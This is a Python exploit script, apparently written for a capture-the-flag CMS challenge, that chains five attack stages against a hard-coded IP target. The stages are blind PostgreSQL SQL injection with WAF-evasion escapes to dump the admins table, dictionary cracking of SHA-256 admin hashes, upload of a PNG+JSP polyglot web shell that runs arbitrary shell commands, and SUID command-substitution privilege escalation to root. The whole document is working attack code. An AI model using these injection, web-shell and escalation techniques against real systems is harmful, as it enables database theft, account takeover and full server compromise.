#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EasyCMS (强网杯) exploit chain:
  1) search SQLi (PostgreSQL E'' backslash escape + U& identifier WAF bypass)
  2) blind extraction of admins table
  3) SHA-256 admin password cracking (rockyou + rules)
  4) admin media upload: PNG+JSP polyglot -> RCE as easycms
  5) SUID /usr/local/bin/easycms-restore command substitution -> root -> /flag

Usage:
  python exp_ezcms.py --stage extract
  python exp_ezcms.py --stage crack --wordlist rockyou.txt
  python exp_ezcms.py --stage admin --user altair --password freedom
  python exp_ezcms.py --stage rce --cmd id
  python exp_ezcms.py --stage flag
"""
import argparse
import base64
import hashlib
import random
import re
import string
import threading
import urllib.parse

import requests

BS = chr(92)  # backslash, built this way to survive shell/editor escaping
PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
)

JSP_SHELL = b'''<%
String c = request.getParameter("c");
if (c != null) {
  try {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
    java.io.InputStream in = p.getInputStream();
    byte[] buf = new byte[8192]; int n;
    StringBuilder sb = new StringBuilder();
    while ((n = in.read(buf)) > 0) sb.append(new String(buf,0,n));
    java.io.InputStream er = p.getErrorStream();
    while ((n = er.read(buf)) > 0) sb.append(new String(buf,0,n));
    p.waitFor();
    out.println("CMDSTART" + sb.toString() + "CMDEND");
  } catch (Exception e) { out.println("CMDERR" + e.toString()); }
}
%>'''


def uesc(name, idx):
    """PostgreSQL U&"..." identifier escape to avoid WAF keyword matches."""
    return 'U&"' + name[:idx] + BS + format(ord(name[idx]), "04x") + name[idx + 1:] + '"'


U_ASCII = uesc("ascii", 0)          # U&"\0061scii"
U_SUBSTR = uesc("substring", 0)     # U&"\0073ubstring"


def q(text):
    return "$$" + text + "$$"


class App:
    def __init__(self, target):
        self.base = target.rstrip("/")
        self.s = requests.Session()
        self.sid = None
        self._local = threading.local()
        user = "u" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self.user = user
        self.s.post(self.base + "/register", data={"username": user, "password": "Passw0rd123"}, timeout=15)
        self.s.post(self.base + "/login", data={"username": user, "password": "Passw0rd123"},
                    timeout=15, allow_redirects=False)
        self.sid = self.s.cookies.get("JSESSIONID")

    def sess(self):
        if getattr(self._local, "s", None) is None:
            s = requests.Session()
            s.cookies.set("JSESSIONID", self.sid)
            self._local.s = s
        return self._local.s

    # ---------- SQLi oracle ----------

    def probe(self, expr):
        payload = BS + "'=(SELECT ((" + expr + ") IS TRUE))-- "
        r = self.sess().get(self.base + "/search", params={"q": payload}, timeout=20)
        r.encoding = "utf-8"
        cnt = re.search(r"的结果（<span>(\d+)", r.text)
        state = re.search(r"SQLSTATE：<code>([^<]*)", r.text)
        err = re.search(r'alert err">([^<]*)', r.text)
        return {
            "count": int(cnt.group(1)) if cnt else None,
            "true": (cnt is not None and int(cnt.group(1)) == 0),
            "state": state.group(1) if state else None,
            "err": err.group(1).strip() if err else None,
        }

    def _len(self, vexpr):
        lo, hi = 1, 255
        while lo < hi:
            mid = (lo + hi) // 2
            r = self.probe(f"sign(length({vexpr}) - {mid}) = 1")
            if r["state"]:
                raise RuntimeError(r)
            if r["true"]:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _char(self, vexpr, i):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = self.probe(f"sign({U_ASCII}({U_SUBSTR}({vexpr}, {i}, 1)) - {mid}) = 1")
            if r["state"]:
                raise RuntimeError(r)
            if r["true"]:
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 0 < lo < 128 else "?"

    def get_str(self, vexpr, workers=12):
        n = self._len(vexpr)
        if n <= 0:
            return ""
        out = [None] * n
        idx = list(range(1, n + 1))
        lock = threading.Lock()

        def work(i):
            out[i - 1] = self._char(vexpr, i)

        threads = []
        pos = 0
        while pos < len(idx):
            batch = idx[pos:pos + workers]
            threads = [threading.Thread(target=work, args=(i,)) for i in batch]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            pos += workers
        return "".join(out)

    # ---------- admin ----------

    def admin_login(self, user, password):
        self.s = requests.Session()
        r = self.s.post(self.base + "/admin/login",
                        data={"username": user, "password": password},
                        timeout=15, allow_redirects=False)
        if r.status_code == 302 and "/admin" in (r.headers.get("Location") or ""):
            self.sid = self.s.cookies.get("JSESSIONID")
            return True
        return False

    def upload_jsp(self, cmd, timeout=30):
        fname = "r%s.jsp" % random.randint(100000, 999999)
        r = self.s.post(self.base + "/admin/media/upload",
                        files={"file": (fname, PNG + JSP_SHELL, "image/png")},
                        timeout=20, allow_redirects=False)
        if r.status_code != 302:
            raise RuntimeError("upload failed: %s %s" % (r.status_code, r.text[:200]))
        url = self.base + "/media/" + urllib.parse.quote(fname)
        rr = self.s.get(url, params={"c": cmd}, timeout=timeout)
        body = rr.content
        i, j = body.find(b"CMDSTART"), body.find(b"CMDEND")
        if i < 0:
            raise RuntimeError("JSP not executed (status=%s): %r" % (rr.status_code, body[:200]))
        return body[i + 8:j].decode("utf-8", "replace")


def stage_extract(app):
    print("[*] version :", app.get_str("version()")[:70])
    print("[*] database:", app.get_str("current_database()"))
    print("[*] db user :", app.get_str("(SELECT current_user)"))
    print("[*] tables  :")
    for n in range(8):
        v = (f"(SELECT relname FROM pg_class WHERE relkind = {q('r')} "
             f"ORDER BY oid DESC OFFSET {n} LIMIT 1)")
        try:
            name = app.get_str(v)
        except Exception as e:
            print("   err", e)
            break
        print("   ", n, name)
    print("[*] admins  :")
    for n in range(5):
        row = {}
        for col in ("username", "display_name", "password_hash"):
            v = f"(SELECT {col} FROM admins ORDER BY id OFFSET {n} LIMIT 1)"
            row[col] = app.get_str(v)
        print("   ", n, row)


def stage_crack(args):
    targets = {h: n for n, h in [
        ("vega", "1ac7df128e4f666bcfe64ba395b285ec69f54ab5e1fbf67b1a86f3bac77a8c36"),
        ("altair", "13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38"),
        ("capella", "bc0445a68f9ac5ef6abc67eb1ab3a9d7ca1b727c219ff89c79fd3ac907b7651c"),
        ("rigel", "24998eacdca975e40ea56aaf0395ff8c5071016f9eae4d1a6a42f25f5db39171"),
        ("atlas", "4dfbab9993e5e8a92c6ed29b2f86c1dfef0c5a475de9fc37481253e79a5c029c"),
    ]}
    suffixes = ["", "1", "12", "123", "1234", "12345", "123456", "2024", "2025", "2026",
                "!", "@123", "@2025", "@2026", "#123", ".2025", "_2025"]
    hits = {}
    with open(args.wordlist, "rb") as f:
        for line in f:
            w = line.rstrip(b"\r\n")
            if not w:
                continue
            bases = {w, w[:1].upper() + w[1:], w.upper()}
            cands = set()
            for b in bases:
                for s in suffixes:
                    cands.add(b + s.encode())
                    cands.add(s.encode() + b)
            for c in cands:
                h = hashlib.sha256(c).hexdigest()
                if h in targets:
                    hits[targets[h]] = c.decode("utf-8", "replace")
                    print("[+] HIT", targets[h], c)
    print("[*] hits:", hits)


def stage_admin(app, args):
    ok = app.admin_login(args.user, args.password)
    print("[*] admin login:", ok)
    if ok:
        r = app.s.get(app.base + "/admin/dashboard", timeout=15, allow_redirects=False)
        print("[*] /admin/dashboard:", r.status_code, len(r.content))


def stage_rce(app, args):
    print(app.upload_jsp(args.cmd))


def stage_flag(app):
    target = "/usr/local/bin/easycms-restore"
    cmd = target + " '$(cat ${PWD:0:1}flag)' 2>&1"
    out = app.upload_jsp(cmd)
    print(out)
    m = re.search(r"flag\{[0-9a-fA-F-]+\}", out)
    print("[+] FLAG:", m.group(0) if m else "NOT FOUND")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://101.200.174.245:34855")
    p.add_argument("--stage", required=True,
                   choices=["extract", "crack", "admin", "rce", "flag"])
    p.add_argument("--wordlist", default="rockyou.txt")
    p.add_argument("--user", default="altair")
    p.add_argument("--password", default="freedom")
    p.add_argument("--cmd", default="id")
    args = p.parse_args()

    if args.stage == "crack":
        stage_crack(args)
        return

    app = App(args.target)
    if args.stage == "extract":
        stage_extract(app)
    elif args.stage == "admin":
        stage_admin(app, args)
    elif args.stage == "rce":
        if not app.admin_login(args.user, args.password):
            raise SystemExit("admin login failed")
        stage_rce(app, args)
    elif args.stage == "flag":
        if not app.admin_login(args.user, args.password):
            raise SystemExit("admin login failed")
        stage_flag(app)


if __name__ == "__main__":
    main()
